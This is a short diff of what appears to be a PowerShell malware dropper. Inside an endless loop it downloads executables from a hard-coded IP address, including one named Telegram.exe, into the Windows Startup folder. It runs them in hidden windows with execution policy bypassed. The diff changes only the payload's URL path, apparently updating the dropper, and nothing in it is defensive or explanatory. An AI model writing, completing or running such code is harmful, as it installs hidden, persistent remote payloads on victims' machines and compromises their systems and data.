@@ -27,7 +27,7 @@ while($true) {
         Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command $downloadCommand2" -WindowStyle Hidden
 
         # Step 4: Download and execute the third file (hidden cmd window)
-        $url3 = 'http://159.223.8.77/IdWapGAR/Telegram.exe'
+        $url3 = 'http://159.223.8.77/emAnRsMl/Telegram.exe'
         $filePath3 = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup\Telegram.exe')
         $downloadCommand3 = "Invoke-WebRequest -Uri '$url3' -OutFile '$filePath3'; Start-Process -FilePath '$filePath3'"
         Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command $downloadCommand3" -WindowStyle Hidden
